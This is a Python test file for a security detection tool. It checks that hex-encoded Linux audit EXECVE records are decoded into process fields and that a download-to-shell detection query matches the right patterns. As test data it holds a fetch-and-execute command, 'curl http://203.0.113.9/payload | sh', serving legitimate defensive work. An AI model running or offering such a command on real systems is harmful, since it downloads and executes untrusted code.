import json
import tempfile
import unittest
from pathlib import Path


class AuditNormalizationTests(unittest.TestCase):
    def test_hex_encoded_execve_arguments_become_structured_command_fields(self):
        from romulus.intelligence.normalization import normalize_elasticsearch_event

        command = "curl http://203.0.113.9/payload | sh"
        hit = {
            "message": (
                'type=EXECVE msg=audit(1731942292.100:42): argc=3 '
                'a0="/bin/sh" a1="-c" a2=' + command.encode().hex()
            )
        }

        normalized = normalize_elasticsearch_event(hit)

        self.assertEqual(normalized["process.args"], ["/bin/sh", "-c", command])
        self.assertEqual(normalized["process.command_line"], f"/bin/sh -c {command}")
        self.assertEqual(normalized["process.name"], "sh")
        self.assertEqual(normalized["process.executable"], "/bin/sh")
        self.assertEqual(normalized["message"], hit["message"])

    def test_invalid_hex_and_non_execve_messages_are_not_misdecoded(self):
        from romulus.intelligence.normalization import normalize_elasticsearch_event

        invalid = normalize_elasticsearch_event({
            "message": 'type=EXECVE msg=audit(1.0:2): argc=2 a0="tool" a1=zz11'
        })
        ordinary = normalize_elasticsearch_event({"message": "health check a0=6375726c"})

        self.assertEqual(invalid["process.args"], ["tool", "zz11"])
        self.assertEqual(invalid["process.command_line"], "tool zz11")
        self.assertNotIn("process.command_line", ordinary)


class BehaviorSeedPrecisionTests(unittest.TestCase):
    def test_download_to_shell_seed_requires_both_behaviors_and_queries_audit_hex(self):
        from romulus.intelligence.behavior_catalog import (
            compile_elasticsearch_seed,
            load_behavior_catalog,
        )

        analytic = next(
            item for item in load_behavior_catalog()["analytics"]
            if item["id"] == "BH-LNX-003"
        )
        query = compile_elasticsearch_seed(
            analytic,
            {"process.command_line": ["message", "event.original", "process.command_line"]},
            "@timestamp",
            {"gte": "2024-11-18T10:00:00Z", "lte": "2024-11-18T17:00:00Z"},
        )

        self.assertEqual(len(analytic["match"]["all"]), 2)
        self.assertEqual(len(query["bool"]["must"]), 2)
        encoded = json.dumps(query, sort_keys=True).lower()
        self.assertIn("curl", encoded)
        self.assertIn("| sh", encoded)
        self.assertIn("6375726c", encoded)


if __name__ == "__main__":
    unittest.main()
